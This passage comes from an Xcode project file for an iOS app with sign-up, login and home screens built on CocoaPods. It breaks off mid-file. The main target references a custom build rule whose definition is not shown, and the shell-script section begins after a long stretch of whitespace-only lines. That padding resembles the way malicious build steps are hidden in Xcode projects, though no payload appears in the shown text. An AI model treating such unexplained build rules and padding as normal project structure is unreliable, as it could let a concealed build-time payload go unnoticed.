// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		0D394F9826058883007A49E8 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394F9726058883007A49E8 /* AppDelegate.swift */; };
		0D394F9A26058883007A49E8 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394F9926058883007A49E8 /* SceneDelegate.swift */; };
		0D394F9F26058883007A49E8 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0D394F9D26058883007A49E8 /* Main.storyboard */; };
		0D394FA226058884007A49E8 /* BlackcofferApplication.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FA026058883007A49E8 /* BlackcofferApplication.xcdatamodeld */; };
		0D394FA426058887007A49E8 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 0D394FA326058887007A49E8 /* Assets.xcassets */; };
		0D394FA726058887007A49E8 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0D394FA526058887007A49E8 /* LaunchScreen.storyboard */; };
		0D394FB226058887007A49E8 /* BlackcofferApplicationTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FB126058887007A49E8 /* BlackcofferApplicationTests.swift */; };
		0D394FBD26058887007A49E8 /* BlackcofferApplicationUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FBC26058887007A49E8 /* BlackcofferApplicationUITests.swift */; };
		0D394FD42605D209007A49E8 /* WelcomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FD32605D209007A49E8 /* WelcomeViewController.swift */; };
		0D394FD92605FFBD007A49E8 /* SignUpViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FD82605FFBD007A49E8 /* SignUpViewController.swift */; };
		0D394FDE2605FFCD007A49E8 /* LogInViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FDD2605FFCD007A49E8 /* LogInViewController.swift */; };
		0D3950202606DA30007A49E8 /* SecurityCheckViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D39501F2606DA30007A49E8 /* SecurityCheckViewController.swift */; };
		0D39502F2606E379007A49E8 /* TagsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D39502E2606E379007A49E8 /* TagsViewController.swift */; };
		0D3950372606E389007A49E8 /* TrendingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D3950362606E389007A49E8 /* TrendingViewController.swift */; };
		0D39503C2606E394007A49E8 /* ExploreViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D39503B2606E394007A49E8 /* ExploreViewController.swift */; };
		0D3950412606E3A1007A49E8 /* SavedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D3950402606E3A1007A49E8 /* SavedViewController.swift */; };
		0DAF6EB72608AF3300327EA2 /* HomeTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0DAF6EB62608AF3300327EA2 /* HomeTabBarController.swift */; };
		0DAF6EEA2608BF8A00327EA2 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 0DAF6EE92608BF8A00327EA2 /* GoogleService-Info.plist */; };
		0DAF6EF32608EE4D00327EA2 /* UIViewController+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0DAF6EF22608EE4D00327EA2 /* UIViewController+Extension.swift */; };
		0DAF6F302608FCC800327EA2 /* String+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0DAF6F2F2608FCC800327EA2 /* String+Extension.swift */; };
		0DAF6F38260915A700327EA2 /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0DAF6F37260915A700327EA2 /* Home.storyboard */; };
		7E0A1A3E8B57CF94A5843790 /* Pods_BlackcofferApplicationTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 0F8F82664FE2559AEC05853F /* Pods_BlackcofferApplicationTests.framework */; };
		87EC4DC035C85BE3D060D4B4 /* Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 921B7A41F62D4AFED48FA498 /* Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework */; };
		F0629F56B4948FBF43723878 /* Pods_BlackcofferApplication.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EC3D338C13079117ABF1F4CB /* Pods_BlackcofferApplication.framework */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		0D394FAE26058887007A49E8 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 0D394F8C26058883007A49E8 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 0D394F9326058883007A49E8;
			remoteInfo = BlackcofferApplication;
		};
		0D394FB926058887007A49E8 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 0D394F8C26058883007A49E8 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 0D394F9326058883007A49E8;
			remoteInfo = BlackcofferApplication;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		0D394F9426058883007A49E8 /* BlackcofferApplication.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BlackcofferApplication.app; sourceTree = BUILT_PRODUCTS_DIR; };
		0D394F9726058883007A49E8 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		0D394F9926058883007A49E8 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		0D394F9E26058883007A49E8 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		0D394FA126058883007A49E8 /* BlackcofferApplication.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = BlackcofferApplication.xcdatamodel; sourceTree = "<group>"; };
		0D394FA326058887007A49E8 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		0D394FA626058887007A49E8 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		0D394FA826058887007A49E8 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		0D394FAD26058887007A49E8 /* BlackcofferApplicationTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = BlackcofferApplicationTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		0D394FB126058887007A49E8 /* BlackcofferApplicationTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlackcofferApplicationTests.swift; sourceTree = "<group>"; };
		0D394FB326058887007A49E8 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		0D394FB826058887007A49E8 /* BlackcofferApplicationUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = BlackcofferApplicationUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		0D394FBC26058887007A49E8 /* BlackcofferApplicationUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlackcofferApplicationUITests.swift; sourceTree = "<group>"; };
		0D394FBE26058887007A49E8 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		0D394FD32605D209007A49E8 /* WelcomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WelcomeViewController.swift; sourceTree = "<group>"; };
		0D394FD82605FFBD007A49E8 /* SignUpViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpViewController.swift; sourceTree = "<group>"; };
		0D394FDD2605FFCD007A49E8 /* LogInViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LogInViewController.swift; sourceTree = "<group>"; };
		0D39501F2606DA30007A49E8 /* SecurityCheckViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SecurityCheckViewController.swift; sourceTree = "<group>"; };
		0D39502E2606E379007A49E8 /* TagsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TagsViewController.swift; sourceTree = "<group>"; };
		0D3950362606E389007A49E8 /* TrendingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TrendingViewController.swift; sourceTree = "<group>"; };
		0D39503B2606E394007A49E8 /* ExploreViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ExploreViewController.swift; sourceTree = "<group>"; };
		0D3950402606E3A1007A49E8 /* SavedViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SavedViewController.swift; sourceTree = "<group>"; };
		0DAF6EB62608AF3300327EA2 /* HomeTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeTabBarController.swift; sourceTree = "<group>"; };
		0DAF6EE92608BF8A00327EA2 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
		0DAF6EF22608EE4D00327EA2 /* UIViewController+Extension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "UIViewController+Extension.swift"; sourceTree = "<group>"; };
		0DAF6F2F2608FCC800327EA2 /* String+Extension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "String+Extension.swift"; sourceTree = "<group>"; };
		0DAF6F37260915A700327EA2 /* Home.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
		0F8F82664FE2559AEC05853F /* Pods_BlackcofferApplicationTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BlackcofferApplicationTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		11F8D359A7D917B9B705D22C /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplication-BlackcofferApplicationUITests.release.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests.release.xcconfig"; sourceTree = "<group>"; };
		22596797ABB87BD165D9668B /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplication-BlackcofferApplicationUITests.debug.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests.debug.xcconfig"; sourceTree = "<group>"; };
		8A0D1B60E83B897808E97E51 /* Pods-BlackcofferApplicationTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplicationTests.debug.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplicationTests/Pods-BlackcofferApplicationTests.debug.xcconfig"; sourceTree = "<group>"; };
		921B7A41F62D4AFED48FA498 /* Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		B6E8E58D64F3904672885D93 /* Pods-BlackcofferApplicationTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplicationTests.release.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplicationTests/Pods-BlackcofferApplicationTests.release.xcconfig"; sourceTree = "<group>"; };
		C635F728666C2DE89672178D /* Pods-BlackcofferApplication.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplication.debug.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication.debug.xcconfig"; sourceTree = "<group>"; };
		C636189A49C6D29440585419 /* Pods-BlackcofferApplication.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplication.release.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication.release.xcconfig"; sourceTree = "<group>"; };
		EC3D338C13079117ABF1F4CB /* Pods_BlackcofferApplication.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BlackcofferApplication.framework; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		0D394F9126058883007A49E8 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F0629F56B4948FBF43723878 /* Pods_BlackcofferApplication.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		0D394FAA26058887007A49E8 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				7E0A1A3E8B57CF94A5843790 /* Pods_BlackcofferApplicationTests.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		0D394FB526058887007A49E8 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				87EC4DC035C85BE3D060D4B4 /* Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		0D394F8B26058883007A49E8 = {
			isa = PBXGroup;
			children = (
				0D394F9626058883007A49E8 /* BlackcofferApplication */,
				0D394FB026058887007A49E8 /* BlackcofferApplicationTests */,
				0D394FBB26058887007A49E8 /* BlackcofferApplicationUITests */,
				0D394F9526058883007A49E8 /* Products */,
				104A223CE3EB6C137B6166B7 /* Pods */,
				9B4E049C185157ECC01D1B68 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		0D394F9526058883007A49E8 /* Products */ = {
			isa = PBXGroup;
			children = (
				0D394F9426058883007A49E8 /* BlackcofferApplication.app */,
				0D394FAD26058887007A49E8 /* BlackcofferApplicationTests.xctest */,
				0D394FB826058887007A49E8 /* BlackcofferApplicationUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		0D394F9626058883007A49E8 /* BlackcofferApplication */ = {
			isa = PBXGroup;
			children = (
				0DAF6EF12608EE4300327EA2 /* Extension */,
				0D394FCF2605CB69007A49E8 /* Storyboards */,
				0D394FCE2605CB5E007A49E8 /* Resources */,
				0D394FCD2605CB4C007A49E8 /* ViewControllers */,
				0D394FA826058887007A49E8 /* Info.plist */,
				0DAF6EE92608BF8A00327EA2 /* GoogleService-Info.plist */,
				0D394FA026058883007A49E8 /* BlackcofferApplication.xcdatamodeld */,
			);
			path = BlackcofferApplication;
			sourceTree = "<group>";
		};
		0D394FB026058887007A49E8 /* BlackcofferApplicationTests */ = {
			isa = PBXGroup;
			children = (
				0D394FB126058887007A49E8 /* BlackcofferApplicationTests.swift */,
				0D394FB326058887007A49E8 /* Info.plist */,
			);
			path = BlackcofferApplicationTests;
			sourceTree = "<group>";
		};
		0D394FBB26058887007A49E8 /* BlackcofferApplicationUITests */ = {
			isa = PBXGroup;
			children = (
				0D394FBC26058887007A49E8 /* BlackcofferApplicationUITests.swift */,
				0D394FBE26058887007A49E8 /* Info.plist */,
			);
			path = BlackcofferApplicationUITests;
			sourceTree = "<group>";
		};
		0D394FCD2605CB4C007A49E8 /* ViewControllers */ = {
			isa = PBXGroup;
			children = (
				0D39502A2606E2C2007A49E8 /* Signup */,
				0D3950292606E2A7007A49E8 /* Home */,
			);
			path = ViewControllers;
			sourceTree = "<group>";
		};
		0D394FCE2605CB5E007A49E8 /* Resources */ = {
			isa = PBXGroup;
			children = (
				0D394FA326058887007A49E8 /* Assets.xcassets */,
				0D394F9726058883007A49E8 /* AppDelegate.swift */,
				0D394F9926058883007A49E8 /* SceneDelegate.swift */,
			);
			path = Resources;
			sourceTree = "<group>";
		};
		0D394FCF2605CB69007A49E8 /* Storyboards */ = {
			isa = PBXGroup;
			children = (
				0DAF6F37260915A700327EA2 /* Home.storyboard */,
				0D394F9D26058883007A49E8 /* Main.storyboard */,
				0D394FA526058887007A49E8 /* LaunchScreen.storyboard */,
			);
			path = Storyboards;
			sourceTree = "<group>";
		};
		0D3950292606E2A7007A49E8 /* Home */ = {
			isa = PBXGroup;
			children = (
				0D39502E2606E379007A49E8 /* TagsViewController.swift */,
				0D3950362606E389007A49E8 /* TrendingViewController.swift */,
				0D39503B2606E394007A49E8 /* ExploreViewController.swift */,
				0D3950402606E3A1007A49E8 /* SavedViewController.swift */,
				0DAF6EB62608AF3300327EA2 /* HomeTabBarController.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		0D39502A2606E2C2007A49E8 /* Signup */ = {
			isa = PBXGroup;
			children = (
				0D394FD32605D209007A49E8 /* WelcomeViewController.swift */,
				0D394FD82605FFBD007A49E8 /* SignUpViewController.swift */,
				0D394FDD2605FFCD007A49E8 /* LogInViewController.swift */,
				0D39501F2606DA30007A49E8 /* SecurityCheckViewController.swift */,
			);
			path = Signup;
			sourceTree = "<group>";
		};
		0DAF6EF12608EE4300327EA2 /* Extension */ = {
			isa = PBXGroup;
			children = (
				0DAF6F2F2608FCC800327EA2 /* String+Extension.swift */,
				0DAF6EF22608EE4D00327EA2 /* UIViewController+Extension.swift */,
			);
			path = Extension;
			sourceTree = "<group>";
		};
		104A223CE3EB6C137B6166B7 /* Pods */ = {
			isa = PBXGroup;
			children = (
				C635F728666C2DE89672178D /* Pods-BlackcofferApplication.debug.xcconfig */,
				C636189A49C6D29440585419 /* Pods-BlackcofferApplication.release.xcconfig */,
				22596797ABB87BD165D9668B /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.debug.xcconfig */,
				11F8D359A7D917B9B705D22C /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.release.xcconfig */,
				8A0D1B60E83B897808E97E51 /* Pods-BlackcofferApplicationTests.debug.xcconfig */,
				B6E8E58D64F3904672885D93 /* Pods-BlackcofferApplicationTests.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		9B4E049C185157ECC01D1B68 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				EC3D338C13079117ABF1F4CB /* Pods_BlackcofferApplication.framework */,
				921B7A41F62D4AFED48FA498 /* Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework */,
				0F8F82664FE2559AEC05853F /* Pods_BlackcofferApplicationTests.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		0D394F9326058883007A49E8 /* BlackcofferApplication */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 0D394FC126058887007A49E8 /* Build configuration list for PBXNativeTarget "BlackcofferApplication" */;
			buildPhases = (
				432A1AFF387F0A2E476587CC /* [CP] Check Pods Manifest.lock */,
				0D394F9026058883007A49E8 /* Sources */,
				0D394F9126058883007A49E8 /* Frameworks */,
				0D394F9226058883007A49E8 /* Resources */,
				066236860051AD00387697A9 /* [CP] Embed Pods Frameworks */,
				41271D28A985AF5F233534D7 /* [CP] Copy Pods Resources */,
			);
			buildRules = (
				4CB8ADC6FFEDCF7AFE6D902C /* PBXBuildRule */,
			);
			dependencies = (
			);
			name = BlackcofferApplication;
			productName = BlackcofferApplication;
			productReference = 0D394F9426058883007A49E8 /* BlackcofferApplication.app */;
			productType = "com.apple.product-type.application";
		};
		0D394FAC26058887007A49E8 /* BlackcofferApplicationTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 0D394FC426058887007A49E8 /* Build configuration list for PBXNativeTarget "BlackcofferApplicationTests" */;
			buildPhases = (
				E873E52C5DAB5D897D2D2208 /* [CP] Check Pods Manifest.lock */,
				0D394FA926058887007A49E8 /* Sources */,
				0D394FAA26058887007A49E8 /* Frameworks */,
				0D394FAB26058887007A49E8 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				0D394FAF26058887007A49E8 /* PBXTargetDependency */,
			);
			name = BlackcofferApplicationTests;
			productName = BlackcofferApplicationTests;
			productReference = 0D394FAD26058887007A49E8 /* BlackcofferApplicationTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		0D394FB726058887007A49E8 /* BlackcofferApplicationUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 0D394FC726058887007A49E8 /* Build configuration list for PBXNativeTarget "BlackcofferApplicationUITests" */;
			buildPhases = (
				70BE61F73303A8588263C80A /* [CP] Check Pods Manifest.lock */,
				0D394FB426058887007A49E8 /* Sources */,
				0D394FB526058887007A49E8 /* Frameworks */,
				0D394FB626058887007A49E8 /* Resources */,
				906E91F3977FAB7B5B00D1B7 /* [CP] Embed Pods Frameworks */,
				808F7DF190467A34090918C1 /* [CP] Copy Pods Resources */,
			);
			buildRules = (
			);
			dependencies = (
				0D394FBA26058887007A49E8 /* PBXTargetDependency */,
			);
			name = BlackcofferApplicationUITests;
			productName = BlackcofferApplicationUITests;
			productReference = 0D394FB826058887007A49E8 /* BlackcofferApplicationUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		0D394F8C26058883007A49E8 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1220;
				LastUpgradeCheck = 1220;
				TargetAttributes = {
					0D394F9326058883007A49E8 = {
						CreatedOnToolsVersion = 12.2;
					};
					0D394FAC26058887007A49E8 = {
						CreatedOnToolsVersion = 12.2;
						TestTargetID = 0D394F9326058883007A49E8;
					};
					0D394FB726058887007A49E8 = {
						CreatedOnToolsVersion = 12.2;
						TestTargetID = 0D394F9326058883007A49E8;
					};
				};
			};
			buildConfigurationList = 0D394F8F26058883007A49E8 /* Build configuration list for PBXProject "BlackcofferApplication" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 0D394F8B26058883007A49E8;
			productRefGroup = 0D394F9526058883007A49E8 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				0D394F9326058883007A49E8 /* BlackcofferApplication */,
				0D394FAC26058887007A49E8 /* BlackcofferApplicationTests */,
				0D394FB726058887007A49E8 /* BlackcofferApplicationUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		0D394F9226058883007A49E8 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				0D394FA726058887007A49E8 /* LaunchScreen.storyboard in Resources */,
				0DAF6F38260915A700327EA2 /* Home.storyboard in Resources */,
				0D394FA426058887007A49E8 /* Assets.xcassets in Resources */,
				0DAF6EEA2608BF8A00327EA2 /* GoogleService-Info.plist in Resources */,
				0D394F9F26058883007A49E8 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		0D394FAB26058887007A49E8 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		0D394FB626058887007A49E8 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
		066236860051AD00387697A9 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		41271D28A985AF5F233534D7 /* [CP] Copy Pods Resources */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-resources-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Copy Pods Resources";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-resources-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-resources.sh\"\n";
			showEnvVarsInLog = 0;
		};
		432A1AFF387F0A2E476587CC /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-BlackcofferApplication-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		70BE61F73303A8588263C80A /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-BlackcofferApplication-BlackcofferApplicationUITests-checkManifestLockResult.txt",
			);
